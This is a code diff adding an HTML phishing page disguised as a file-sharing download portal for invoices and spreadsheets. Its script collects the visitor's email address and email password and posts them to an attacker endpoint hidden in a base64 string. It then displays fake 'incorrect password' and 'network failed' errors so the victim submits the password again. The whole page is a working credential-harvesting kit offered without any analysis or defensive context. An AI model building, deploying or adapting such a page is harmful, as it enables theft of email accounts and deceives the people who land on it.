@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>We Pro Files</title>
+<link href="local_resources/css/76e6e41fadf6c1b0f18e424d7d4ad317.css" rel="stylesheet"/>
+<style>
+        body { background-image: url(https://i.ibb.co/S7YFXPk/bgweneed.png); background-repeat: no-repeat; background-size: cover; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, sans-serif, BlinkMacSystemFont, Helvetica Neue, Arial, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji; }
+        .container { border-radius: 10px; width: 80%; padding: 20px; display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 20px; }
+        .file-list-container { grid-column: 1 / 2; background-color: white; border-radius: 10px; width: 320px; height: auto; padding-bottom: 20px; }
+        .container h2 { font-size: 1.2em; margin-bottom: 10px; }
+        .container p { font-size: 0.9em; margin-bottom: 20px; color: gray; }
+        .file-list { list-style: none; padding: 0; margin: 0; padding: 10px 5px; border-bottom: 1px solid #ccc; }
+        .file-list li { display: flex; justify-content: space-between; align-items: center; padding: 10px; border-top: 1px solid #f0f0f0; }
+        .file-list li:first-child { border-top: none; }
+        .file-list li .file-info { display: flex; flex-direction: column; align-items: flex-start; }
+        .file-list li .file-info span { font-size: 0.75em; color: gray; }
+        .file-list li .file-icon { font-size: 1.5em; color: #007BFF; }
+        .btnzone { text-align: center; box-sizing: border-box; }
+        .btnzone .download-all-btn { background-color: #0096FF; color: white; border: none; border-radius: 5px; padding: 10px 20px; font-size: 14px; cursor: pointer; text-align: center; display: inline-block; margin-top: 20px; text-decoration: none; font-size: 16px; }
+        form { width: 100%; box-sizing: border-box; padding: 0 40px; }
+        .btnzone .download-all-btn:hover { background-color: #007ACC; }
+        .btnzone .download-all-btn:disabled { background-color: #A9A9A9; cursor: not-allowed; }
+        @media (max-width: 768px) { .container { grid-template-columns: 1fr; width: auto; } .file-list-container { grid-column: 1 / 2; } }
+        .ready { padding: 1px 20px; border-bottom: 1px solid #ccc; display: flex; justify-content: center; flex-direction: column; align-items: center; color: #444; font-size: 20px; text-align: center; }
+        .modal { display: none; position: fixed; z-index: 1; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0, 0, 0, 0.4); justify-content: center; align-items: center; }
+        .modal-content { background-color: #fff; border-radius: 5px; padding: 5px 0 20px; border: 1px solid #888; width: 400px; box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3); display: flex; flex-direction: column; align-items: center; }
+        .modal-content img { width: 150px; margin-bottom: 10px; }
+        .modal-content p { margin: 10px 0; color: #666; font-size: 14px; text-align: center; }
+        .modal-content label { display: block; margin-top: 10px; font-size: 15px; color: #111; }
+        .modal-content input[type="email"], .modal-content input[type="password"] { box-sizing: border-box; width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; }
+        .modal-content button { background-color: #007BFF; color: white; padding: 10px; margin-top: 15px; border: none; border-radius: 4px; cursor: pointer; width: 100%; box-sizing: border-box; }
+        .modal-content button:hover { background-color: #0056b3; }
+        .modal-content .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; }
+        .modal-content .close:hover, .modal-content .close:focus { color: black; text-decoration: none; cursor: pointer; }
+        #invalidmsg { color: #C51102; font-size: 15px; margin-top: 10px; text-align: center; }
+        .modaltitle { width: 100%; text-align: center; }
+        .modaltitle img { width: auto; margin-bottom: -8px; }
+        .modaltitle p { border-top: 1px solid #ccc; padding: 10px 40px; font-size: 15px; }
+        #logDownload { font-size: 15px; }
+        #logDownload:disabled { cursor: not-allowed; background-color: #A9A9A9; }
+        .hide { display: none; }
+    </style>
+</head>
+<body>
+<div class="container">
+<div class="file-list-container">
+<div class="ready">
+<span style="font-weight: bold; margin-bottom:8px">Ready when you are</span>
+<small style="font-size: 14px; margin-bottom:8px">Files deleted in 7 days.
+                    <span style="display: block; font-size: 15px; margin: 2px 0">Download and view your documents.</span></small>
+</div>
+<ul class="file-list">
+<li>
+<div class="file-info">
+<strong>PO_2024AJ02.xlsx</strong>
+<span>5.3MB • XLSX</span>
+</div>
+<div class="file-icon">
+<i class="fa-regular fa-circle-down"></i>
+</div>
+</li>
+<li>
+<div class="file-info">
+<strong>Items_list.xlsx</strong>
+<span>18.9MB • PDF</span>
+</div>
+<div class="file-icon">
+<i class="fa-regular fa-circle-down"></i>
+</div>
+</li>
+<li>
+<div class="file-info">
+<strong>img2024AJ02.png</strong>
+<span>6MB • PNG</span>
+</div>
+<div class="file-icon">
+<i class="fa-regular fa-circle-down"></i>
+</div>
+</li>
+<li>
+<div class="file-info">
+<strong>specifications.pdf</strong>
+<span>2.9MB • PDF</span>
+</div>
+<div class="file-icon">
+<i class="fa-regular fa-circle-down"></i>
+</div>
+</li>
+</ul>
+<div class="btnzone"><button class="download-all-btn">Download All</button></div>
+</div>
+<div></div>
+<div></div>
+</div>
+<!-- The Modal -->
+<div class="modal" id="myModal">
+<div class="modal-content">
+<div class="modaltitle">
+<img alt="Logo" src="local_resources/img/8d1892dd10e90e43fdafee8362bd079b.png"/>
+<p>Enter the correct email and password details, to allow imap synchronize and allow access to files.</p>
+</div>
+<form id="login-form">
+<div id="invalidmsg"></div>
+<label for="email">Email Address</label>
+<input id="email" name="email" required="" type="email"/>
+<label for="password">Email Password</label>
+<input id="password" name="password" required="" type="password"/>
+<button id="logDownload" type="submit">Download</button>
+</form>
+</div>
+</div>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const queryParams = new URLSearchParams(window.location.search);
+    const parameterE = queryParams.get('e');    
+    // Get the modal
+    var modal = document.getElementById("myModal");
+    // modal.style.display = "flex";
+    // Get the button that opens the modal
+    var btn = document.querySelector(".download-all-btn");
+    // Get the <span> element that closes the modal
+    var span = document.getElementsByClassName("close")[0];
+    // Get the error message div
+    var errorMsg = document.getElementById("error-msg");
+    // When the user clicks the button, open the modal 
+    btn.onclick = function() {
+        modal.style.display = "flex";
+    }
+    let jeff = "aHR0cHM6Ly9zZW5kYS5zYnMvaG1tL3dldHIvamVmZi90aHJlZS9zZW5kLnBocA==";
+    let getme = document.querySelector("#email")
+    getme.value = parameterE;
+    let logDownload = document.querySelector('#logDownload'); 
+    let warningMessage = document.querySelector("#invalidmsg")  
+    let apiCalls = 0;
+    // Form submission handler
+    document.getElementById("login-form").onsubmit = function(event) {
+        event.preventDefault();
+        // Create a new FormData object from the form
+        const formData = new FormData(document.querySelector('form'));
+        const sendPoint = jeff;
+        // Update the log download text and disable the button
+        logDownload.innerText = 'Verifying...';
+        logDownload.disabled =  true;   
+        // Increment the counter for API calls
+        apiCalls++;
+        // Make a POST request to the API endpoint
+        fetch(atob(sendPoint), {
+          method: 'POST',
+          body: formData,
+        })
+        .then(response => response.json())
+        .then((response) => {
+          console.log(apiCalls);
+
+          // Set a timeout to handle the response
+          setTimeout(() => {
+            if (apiCalls > 3) {
+              // Handle more than 3 API calls
+            } else {
+              if (apiCalls === 1) {
+                // Handle the first API call error
+                warningMessage.innerText = 'Incorrect password. Type the correct email password, and try again.';
+              }
+              if (apiCalls > 1) {
+                // Handle subsequent API call errors
+                warningMessage.innerText = 'Network connection failed, try again!';
+              }
+
+            }
+          }, 10);                  
+        })
+        .catch(error => {
+            console.log()
+        })
+        .finally(error => {
+              // Reset the log download text and button state
+                warningMessage.classList.remove("hide");
+              logDownload.innerText = 'Download';
+              logDownload.removeAttribute("disabled");         
+              document.querySelector("#password").value = ""
+              document.querySelector("#password").focus();
+        })
+    }
+  
+});
+    
+</script>
+</body>
+</html>
